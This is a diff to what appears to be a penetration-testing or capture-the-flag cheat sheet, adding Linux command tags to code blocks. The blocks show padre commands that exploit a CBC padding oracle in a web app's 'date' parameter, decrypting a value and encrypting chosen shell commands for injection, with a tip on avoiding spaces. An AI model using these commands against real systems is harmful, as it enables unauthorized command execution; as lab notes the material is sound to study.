@@ -19,6 +19,7 @@ When an encrypted CBC parameter has a padding oracle and the decrypted value is 
 
 ## Decrypt Existing Value
 
+<!-- cmd: linux -->
 ```bash
 padre -cookie 'PHPSESSID=...; role=...' \
   -u "http://$TARGET:1337/dashboard.php?date=$" \
@@ -33,6 +34,7 @@ date +%Y
 
 ## Encrypt Chosen Commands
 
+<!-- cmd: linux -->
 ```bash
 padre -cookie 'PHPSESSID=...; role=...' \
   -u "http://$TARGET:1337/dashboard.php?date=$" \
@@ -41,6 +43,7 @@ padre -cookie 'PHPSESSID=...; role=...' \
 
 For commands where spaces break handling, use shell syntax that avoids spaces:
 
+<!-- cmd: linux -->
 ```bash
 padre -cookie 'PHPSESSID=...; role=...' \
   -u "http://$TARGET:1337/dashboard.php?date=$" \
@@ -49,6 +52,7 @@ padre -cookie 'PHPSESSID=...; role=...' \
 
 Decode output:
 
+<!-- cmd: linux -->
 ```bash
 echo "OUTPUT_BASE64" | base64 -d
 ```
